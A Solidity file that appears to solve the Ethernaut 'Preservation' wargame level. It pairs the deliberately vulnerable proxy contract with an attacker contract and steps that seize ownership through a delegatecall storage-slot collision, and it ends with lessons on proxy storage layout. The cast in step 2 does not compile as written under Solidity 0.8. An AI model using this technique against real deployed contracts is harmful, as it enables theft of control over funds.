// Ethernaut Challenge #16: Preservation
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
 * PRESERVATION CHALLENGE
 * 
 * Goal: Take ownership of the Preservation contract.
 * 
 * THE VULNERABILITY:
 * This is a delegatecall proxy pattern with STORAGE COLLISION.
 * 
 * Storage layout MUST match between proxy and implementation:
 * 
 * Preservation (proxy):
 *   slot 0: address public timeZone1Library
 *   slot 1: address public timeZone2Library  
 *   slot 2: address public owner
 *   slot 3: uint storedTime
 * 
 * LibraryContract (implementation):
 *   slot 0: uint storedTime  ← COLLISION!
 * 
 * When delegatecall executes setTime(), it writes to slot 0
 * of the PRESERVATION contract (the caller's storage), not
 * the LibraryContract's storage.
 * 
 * So setTime(address) overwrites timeZone1Library!
 */

contract PreservationExploit {
    // We need to match the storage layout to exploit this
    // But actually we just need to be the attacker contract
    
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;
    
    function setTime(uint _time) public {
        // When called via delegatecall, this writes to slot 2
        // of the PRESERVATION contract (owner slot)
        owner = tx.origin; // Or msg.sender depending on call chain
    }
}

contract Preservation {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;
    
    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }
    
    function setFirstTime(uint _timeStamp) public {
        // delegatecall to library - writes to OUR storage!
        (bool success,) = timeZone1Library.delegatecall(
            abi.encodeWithSignature("setTime(uint256)", _timeStamp)
        );
        require(success);
    }
    
    function setSecondTime(uint _timeStamp) public {
        (bool success,) = timeZone2Library.delegatecall(
            abi.encodeWithSignature("setTime(uint256)", _timeStamp)
        );
        require(success);
    }
}

contract LibraryContract {
    uint storedTime;  // slot 0 - collides with timeZone1Library!
    
    function setTime(uint _time) public {
        storedTime = _time;
    }
}

/*
 * ATTACK STEPS:
 * 
 * 1. Deploy PreservationExploit contract
 * 2. Call setFirstTime(uint(address(exploitContract)))
 *    - This overwrites timeZone1Library with our exploit address!
 *    - Because LibraryContract writes to slot 0 (storedTime)
 *    - But in Preservation, slot 0 is timeZone1Library
 * 
 * 3. Now timeZone1Library points to our exploit
 * 4. Call setFirstTime(0) again (any value)
 *    - This delegates to OUR contract
 *    - Our setTime() writes to slot 2 (owner)
 *    - We become the owner!
 * 
 * LESSON:
 * - Delegatecall is dangerous - it uses caller's storage
 * - Storage layout MUST be identical between proxy and implementation
 * - Slot collision can overwrite critical variables
 * - Proxy patterns need extreme care with storage layout
 * 
 * This is how the Parity Multisig was hacked ($30M lost).
 */
